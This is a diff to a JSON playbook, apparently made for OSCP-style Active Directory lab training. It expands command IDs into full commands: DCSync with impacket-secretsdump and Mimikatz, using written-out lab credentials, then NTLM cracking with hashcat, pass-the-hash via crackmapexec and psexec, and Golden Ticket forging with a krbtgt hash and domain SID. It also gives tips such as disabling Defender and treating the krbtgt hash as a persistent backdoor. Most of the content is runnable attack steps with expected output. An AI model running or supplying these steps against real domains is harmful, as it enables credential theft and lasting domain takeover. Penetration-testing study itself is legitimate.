@@ -123,7 +123,7 @@
           "context": "You have achieved Domain Admin access as jeffadmin. You want to establish persistent domain-wide access that survives password changes and account lockouts. Your target is the krbtgt account hash, which enables Golden Ticket creation.",
           "objective": "Extract the krbtgt account password hash, obtain the Domain SID, and prepare data for Golden Ticket creation. This provides long-term persistence independent of other account credentials.",
           "approach": [
-            "1. UNDERSTAND KRBTGT'S ROLE: The krbtgt account (RID 502) is a disabled service account used by the Key Distribution Center (KDC) to encrypt and sign all Kerberos Ticket Granting Tickets (TGTs). Its password hash is the cryptographic key for TGT validation. With this hash, you can forge TGTs (Golden Tickets) that grant Domain Admin rights to any user. The krbtgt password is randomly generated at domain creation and ONLY changes during domain functional level upgrades (e.g., Server 2003 → 2008). In mature environments, this hash may be 10+ years old.",
+            "1. UNDERSTAND KRBTGT'S ROLE: The krbtgt account (RID 502) is a disabled service account used by the Key Distribution Center (KDC) to encrypt and sign all Kerberos Ticket Granting Tickets (TGTs). Its password hash is the cryptographic key for TGT validation. With this hash, you can forge TGTs (Golden Tickets) that grant Domain Admin rights to any user. The krbtgt password is randomly generated at domain creation and ONLY changes during domain functional level upgrades (e.g., Server 2003 \u2192 2008). In mature environments, this hash may be 10+ years old.",
             "2. DCSYNC KRBTGT (IMPACKET METHOD - RECOMMENDED): From Kali, run: impacket-secretsdump -just-dc-user krbtgt 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70'. This targets only the krbtgt account. Output format: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1693c6cefafffc7af11ef34d1c788f47:::. The NTLM hash (1693c6ce...) is your Golden Ticket key. Save this immediately - it's your persistent backdoor.",
             "3. DCSYNC KRBTGT (MIMIKATZ METHOD): If using Windows, launch Mimikatz and run: lsadump::dcsync /user:corp\\krbtgt. Parse the output for 'Hash NTLM: [32 hex characters]'. You may also see AES256 and AES128 keys - save these for stealthier Golden Tickets (AES encryption is less suspicious than RC4).",
             "4. OBTAIN DOMAIN SID: The Domain SID is required for Golden Ticket creation. From Windows as any domain user: whoami /user. Output shows: corp\\jeffadmin S-1-5-21-1987370270-658905905-1781884369-1105. The Domain SID is S-1-5-21-1987370270-658905905-1781884369 (remove the user RID -1105). From Linux: lookupsid.py 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70' | grep 'Domain SID'. Or: rpcclient -U 'corp.com/jeffadmin%BrouhahaTungPerorateBroom2023!' 192.168.50.70 -c 'lsaquery'.",
@@ -189,46 +189,110 @@
           "title": "Phase 1: Prerequisites and Rights Verification",
           "notes": "Before attempting DCSync, verify you have Domain Admin membership OR explicit replication rights. Test domain controller connectivity and save DC IP/FQDN for commands.",
           "commands": [
-            "ad-dcsync-check-user-groups",
-            "ad-dcsync-check-domain-admins",
-            "ad-dcsync-check-replication-rights"
+            {
+              "id": "ad-dcsync-check-user-groups",
+              "example": "whoami /groups",
+              "shows": "Output contains: 'GROUP INFORMATION'"
+            },
+            {
+              "id": "ad-dcsync-check-domain-admins",
+              "example": "net group \"Domain Admins\" /domain",
+              "shows": "Output contains: 'Group name     Domain Admins'"
+            },
+            {
+              "id": "ad-dcsync-check-replication-rights",
+              "example": "powershell -c \"(Get-Acl 'AD:\\DC=corp,DC=com').Access | Where-Object {$_.IdentityReference -eq 'CORP\\jeffadmin' -and ($_.ObjectType -eq '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2' -or $_.ObjectType -eq '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2')} | Select IdentityReference, ActiveDirectoryRights, ObjectType\"",
+              "shows": "Output shows: IdentityReference = <DOMAIN>\\<USERNAME>"
+            }
           ]
         },
         {
           "title": "Phase 2: Credential Extraction (Windows - Mimikatz)",
           "notes": "Windows-based DCSync using Mimikatz. Useful when you have RDP/shell access to a Windows machine. Requires Mimikatz binary on target system.",
           "commands": [
-            "ad-dcsync-mimikatz-user",
-            "ad-dcsync-mimikatz-krbtgt",
-            "ad-dcsync-mimikatz-administrator"
+            {
+              "id": "ad-dcsync-mimikatz-user",
+              "example": "mimikatz # lsadump::dcsync /user:corp\\dave",
+              "shows": "Output: '[DC] <DOMAIN>.com will be the domain'"
+            },
+            {
+              "id": "ad-dcsync-mimikatz-krbtgt",
+              "example": "mimikatz # lsadump::dcsync /user:corp\\krbtgt",
+              "shows": "Output: 'SAM Username : krbtgt'"
+            },
+            {
+              "id": "ad-dcsync-mimikatz-administrator",
+              "example": "mimikatz # lsadump::dcsync /user:corp\\Administrator",
+              "shows": "Output: 'SAM Username : Administrator'"
+            }
           ]
         },
         {
           "title": "Phase 3: Credential Extraction (Linux - Impacket) [RECOMMENDED]",
           "notes": "Linux-based DCSync from Kali using impacket-secretsdump. RECOMMENDED for OSCP - no AV interference, clean output, works with Pass-the-Hash authentication.",
           "commands": [
-            "ad-dcsync-secretsdump-user",
-            "ad-dcsync-secretsdump-krbtgt",
-            "ad-dcsync-secretsdump-all"
+            {
+              "id": "ad-dcsync-secretsdump-user",
+              "example": "impacket-secretsdump -just-dc-user dave 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70'",
+              "shows": "Output: 'Impacket v0.x.x - Copyright 2022 SecureAuth Corp..."
+            },
+            {
+              "id": "ad-dcsync-secretsdump-krbtgt",
+              "example": "impacket-secretsdump -just-dc-user krbtgt 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70'",
+              "shows": "Output: 'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTL..."
+            },
+            {
+              "id": "ad-dcsync-secretsdump-all",
+              "example": "impacket-secretsdump -just-dc 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70'",
+              "shows": "Output: '[*] Dumping Domain Credentials (domain\\uid:rid:l..."
+            }
           ]
         },
         {
           "title": "Phase 4: Hash Cracking and Pass-the-Hash",
           "notes": "Process extracted hashes for either plaintext password recovery (Hashcat) or immediate use via Pass-the-Hash. Run cracking in background while performing lateral movement.",
           "commands": [
-            "windows-hashcat-crack-ntlm",
-            "ad-pass-the-hash-crackmapexec",
-            "ad-pass-the-hash-impacket-psexec"
+            {
+              "id": "windows-hashcat-crack-ntlm",
+              "example": "hashcat -m 1000 -a 0 dave_hash.txt /usr/share/wordlists/rockyou.txt --force",
+              "shows": "Output: 'Session..........: hashcat'"
+            },
+            {
+              "id": "ad-pass-the-hash-crackmapexec",
+              "example": "crackmapexec smb 192.168.50.0/24 -u dave -H 08d7a47a6f9f66b97b1bae4178747494 -d corp.com",
+              "shows": "Output: '<IP> (Pwn3d!)' - User has LOCAL ADMINISTRATOR ri..."
+            },
+            {
+              "id": "ad-pass-the-hash-impacket-psexec",
+              "example": "impacket-psexec -hashes :08d7a47a6f9f66b97b1bae4178747494 corp.com/dave@192.168.50.75",
+              "shows": "Output: '[*] Requesting shares on <TARGET>....'"
+            }
           ]
         },
         {
           "title": "Phase 5: Persistence via Golden Ticket",
           "notes": "Use extracted krbtgt hash to create Golden Tickets for long-term domain persistence. Requires: krbtgt NTLM hash, Domain SID, Domain FQDN, valid username.",
           "commands": [
-            "ad-sid-whoami-extract",
-            "ad-golden-ticket-purge-tickets",
-            "ad-golden-ticket-mimikatz-create",
-            "ad-golden-ticket-ticketer-create"
+            {
+              "id": "ad-sid-whoami-extract",
+              "example": "whoami /user",
+              "shows": "Output displays 'User Name' and 'SID' columns"
+            },
+            {
+              "id": "ad-golden-ticket-purge-tickets",
+              "example": "mimikatz # kerberos::purge",
+              "shows": "Output: 'Ticket(s) purge for current session is OK'"
+            },
+            {
+              "id": "ad-golden-ticket-mimikatz-create",
+              "example": "mimikatz # kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt",
+              "shows": "Output: 'User      : <username>'"
+            },
+            {
+              "id": "ad-golden-ticket-ticketer-create",
+              "example": "[Command ad-golden-ticket-ticketer-create not found in database]",
+              "shows": "See command documentation"
+            }
           ]
         }
       ],
@@ -313,7 +377,7 @@
         "Test connectivity to DC BEFORE attempting DCSync (save time on troubleshooting)",
         "If Mimikatz blocked by AV: Disable Windows Defender OR use impacket-secretsdump from Kali",
         "For lateral movement: Use wmiexec instead of psexec (less noisy, no service creation)",
-        "Time estimate for DA→Golden Ticket: 5-10 minutes total (DCSync krbtgt + create ticket)",
+        "Time estimate for DA\u2192Golden Ticket: 5-10 minutes total (DCSync krbtgt + create ticket)",
         "Remember: NTLM hash alone is sufficient for Windows auth - password cracking is optional"
       ],
       "related_commands": [
